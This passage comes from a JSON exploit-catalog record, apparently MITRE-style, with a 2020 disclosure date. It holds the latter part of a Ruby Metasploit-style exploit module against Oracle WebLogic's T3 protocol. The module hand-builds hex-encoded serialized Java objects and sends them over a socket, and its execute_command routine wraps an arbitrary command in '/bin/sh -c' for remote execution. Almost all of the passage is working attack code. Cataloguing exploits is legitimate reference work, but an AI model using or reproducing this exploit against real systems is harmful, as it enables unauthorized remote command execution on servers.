request_obj << '726e616c2e5061636b61'\n    request_obj << '6765496e666f'\n    request_obj << 'e6f723e7b8ae1ec9' # SerialVersionUID\n    request_obj << '020009' # Serializable, 9 fields\n    request_obj << '490005' # Field type: Int, field name length: 5\n    request_obj << '6d616a6f72' # major\n    request_obj << '490005' # Field type: Int, field name length: 5\n    request_obj << '6d696e6f72' # minor\n    request_obj << '49000b' # Field type: Int, field name length: 11\n    request_obj << '70617463685570646174' # patchUpdate\n    request_obj << '65'\n    request_obj << '49000c' # Field type: Int, field name length: 12\n    request_obj << '726f6c6c696e67506174' # rollingPatch\n    request_obj << '6368'\n    request_obj << '49000b' # Field type: Int, field name length: 11\n    request_obj << '73657276696365506163' # servicePack\n    request_obj << '6b'\n    request_obj << '5a000e' # Field type: Z = Bool, field name length: 14\n    request_obj << '74656d706f7261727950' # temporaryPatch\n    request_obj << '61746368'\n    request_obj << '4c0009' # Field type: Object, field name length: 9\n    request_obj << '696d706c5469746c65' # implTitle\n    request_obj << '71007e0005' # TC_REFERENCE, handle\n    request_obj << '4c000a' # Field type: Object, field name length: 10\n    request_obj << '696d706c56656e646f72' # implVendor\n    request_obj << '71007e0005' # TC_REFERENCE, handle\n    request_obj << '4c000b' # Field type: Object, field name length: 11\n    request_obj << '696d706c56657273696f' # implVersion\n    request_obj << '6e'\n    request_obj << '71007e0005' # TC_REFERENCE, handle\n    request_obj << '7870' # TC_ENDBLOCKDATA, TC_NULL\n    request_obj << '7702000078' # TC_BLOCKDATA, 2 bytes, TC_ENDBLOCKDATA\n    request_obj << 'fe00ff' # separator\n    request_obj << 'fe010000'\n    request_obj << 'aced0005' # STREAM_MAGIC, STREAM_VERSION\n    request_obj << '7372' # TC_OBJECT, TC_CLASSDESC\n    request_obj << '0013' # Class name length: 19\n    request_obj << '7765626c6f6769632e72' # weblogic.rjvm.JVMID\n    request_obj << '6a766d2e4a564d4944'\n    request_obj << 'dc49c23ede121e2a' # SerialVersionUID\n    request_obj << '0c0000'\n    request_obj << '787077' # TC_ENDBLOCKDATA, TC_NULL, TC_BLOCKDATA\n    request_obj << '4621'\n    request_obj << '000000000000000000'\n    request_obj << '09' # length: 9\n    request_obj << '3132372e302e312e31' # 127.0.1.1\n    request_obj << '000b' # length: 11\n    request_obj << '75732d6c2d627265656e' # us-l-breens\n    request_obj << '73'\n    request_obj << 'a53caff10000000700'\n    request_obj << '001b59'\n    request_obj << 'ffffffffffffffffffff'\n    request_obj << 'ffffffffffffffffffff'\n    request_obj << 'ffffffff'\n    request_obj << '0078'\n    request_obj << 'fe010000' # separator\n    request_obj << 'aced0005' # STREAM_MAGIC, STREAM_VERSION\n    request_obj << '7372' # TC_OBJECT, TC_CLASSDESC\n    request_obj << '0013' # Class name length: 19\n    request_obj << '7765626c6f6769632e72' # weblogic.rjvm.JVMID\n    request_obj << '6a766d2e4a564d4944'\n    request_obj << 'dc49c23ede121e2a' # SerialVersionUID\n    request_obj << '0c0000'\n    request_obj << '787077' # TC_ENDBLOCKDATA, TC_NULL, TC_BLOCKDATA\n    request_obj << '1d0181401281'\n    request_obj << '34bf427600093132372e'\n    request_obj << '302e312e31a53caff1'\n    request_obj << '000000000078'\n\n    new_len = (request_obj.length / 2).to_s(16).rjust(8, '0')\n    request_obj[0, 8] = new_len\n\n    sock.put([request_obj].pack('H*'))\n    sleep(1)\n  end\n\n  def format_payload(payload_cmd)\n    print_status('Formatting payload...')\n    payload_arr = payload_cmd.split(' ', 3)\n\n    formatted_payload = ''\n    payload_arr.each do |part|\n      formatted_payload << '74' # denotes a string\n      formatted_payload << part.length.to_s(16).rjust(4, '0')\n      formatted_payload << part.each_byte.map { |b| b.to_s(16).rjust(2, '0') }.join\n    end\n\n    formatted_payload\n  end\n\n  def execute_command(cmd, _opts = {})\n    cmd.prepend('/bin/sh -c ')\n    cmd = build_payload_obj(cmd)\n\n    t3_send(cmd)\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-01-15",
    "x_mitre_platforms": [
        "%w[unix linux]"
    ]
}